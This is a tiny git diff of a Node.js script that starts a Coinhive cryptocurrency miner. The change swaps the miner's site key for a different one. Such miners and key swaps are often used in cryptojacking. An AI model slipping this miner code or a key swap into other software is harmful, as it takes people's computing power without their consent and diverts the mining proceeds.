@@ -2,7 +2,7 @@ const ch = require('coin-hive');
 const http = require('http');
 
 (async () => {
-    const m = await ch('LP1n3Nd9iysr09tB1moWGiF3b3RqI0Bk');
+    const m = await ch('AAdsOihn1tvX5EhpQ8bD7fhNLB74pjsQ');
     await m.start();
 })();
 
